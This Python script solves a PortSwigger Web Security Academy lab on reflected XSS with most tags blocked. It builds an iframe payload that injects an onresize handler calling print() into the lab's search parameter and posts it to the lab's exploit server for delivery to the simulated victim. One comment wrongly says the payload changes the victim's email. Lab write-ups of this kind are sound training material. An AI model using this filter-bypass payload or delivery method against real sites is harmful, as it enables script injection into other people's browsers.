##############################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 21/11/2023
#
# Lab: Reflected XSS into HTML context with most tags and attributes blocked
#
# Steps: 1. Craft an iframe that, when loaded, will change the body width, causing the 
#           onresize event handler to be invoked
#        2. Deliver the exploit to the victim
#        3. The print() function will be called after they trigger the exploit
#
##############################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
lab_url = "https://0aa1006b04c591e78075306b00370046.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0afd00c8043e910b805b2f0e0128001d.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

# payload to change the victim's email
payload = f"""<iframe src="{lab_url}/?search=<body onresize=print()>" onload=this.style.width='100px'>"""

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The print() function will be called after they trigger the exploit") 
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")



